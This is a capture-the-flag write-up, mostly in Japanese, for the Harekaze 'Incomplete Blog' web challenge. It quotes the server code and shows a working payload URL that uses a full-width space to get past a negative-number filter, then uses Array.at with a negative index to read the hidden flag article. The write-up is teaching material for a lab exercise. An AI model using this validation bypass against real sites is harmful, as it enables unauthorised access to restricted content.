# Incomplete Blog:Web:201pts
JavaScriptでブログを作ってみました。  
ただ、まだ開発中ですし、有料記事のための課金システムも今頑張って作っているところで未完成です。なので、一部の有料にするつもりの記事は閲覧できません。ごめんなさい😉  
[http://incomplete-blog.harekaze.com](http://incomplete-blog.harekaze.com/)  
添付ファイル:  
- [incomplete-blog.zip](incomplete-blog.zip)  

---

I made a blog with JavaScript.  
This blog is currently under development. I'm working hard to implement a payment system for reading premium content, but it is not ready yet. So, more than 9000 articles that will be premium content are not available so far. Sorry for the inconvenience😉  
[http://incomplete-blog.harekaze.com](http://incomplete-blog.harekaze.com/)  
Attachments:  
- [incomplete-blog.zip](incomplete-blog.zip)  

# Solution
サイトにアクセスすると記事が見れるようだ。  
Incomplete Blog  
[site.png](site/site.png)  
`/article/0`などで記事の中身が見られるようだが、10以上はアクセスできない。  
incomplete-blog.zipが配布されており、以下のようであった。  
```js
~~~
// generate articles
let articles = [];
for (let i = 0; i < 10000; i++) {
  articles.push({
    title: `Dummy article ${i}`,
~~~
  });
}
articles[1337] = {
  title: 'Flag',
  content: `Wow, how do you manage to read this article? Anyway, the flag is: <code>${flag}</code>`
};
~~~
app.get('/article/:id', async (request, reply) => {
  // id should not be negative 
  if (/^[\b\t\n\v\f\r \xa0]*-/.test(request.params.id)) {
    return reply.view('article.ejs', {
      title: 'Access denied',
      content: 'Hacking attempt detected.'
    });
  }

  let id = parseInt(request.params.id, 10);

  // free users cannot read articles with id >9
  if (id > 9) {
    return reply.view('article.ejs', {
      title: 'Access denied',
      content: 'You need to become a premium user to read this content.'
    });
  }

  const article = articles.at(id) ?? {
    title: 'Not found',
    content: 'The requested article was not found.'
  };
~~~
```
1337番目の記事にフラグがあり、`^[\b\t\n\v\f\r \xa0]*-`が禁止されている。  
jsの`at`は負の数でも要素をとれるが、`-`で開始することも禁止されている。  
ここで`parseInt`は全角スペースを挿入してもうまく動作することに気づく。  
```bash
$ node
> parseInt(" -1",10)
-1
> parseInt("　-1",10)
-1
```
あとは`全角スペース-(10000-1337)`で133番目の記事が閲覧できる。  
`http://incomplete-blog.harekaze.com/article/%E3%80%80-8663`にアクセスしてやればよい。  
[flag.png](site/flag.png)  
flagが得られた。  

## HarekazeCTF{I_d0nt_kn0w_h0w_t0_m4ke_ctf_ch4llenges_t4sukete}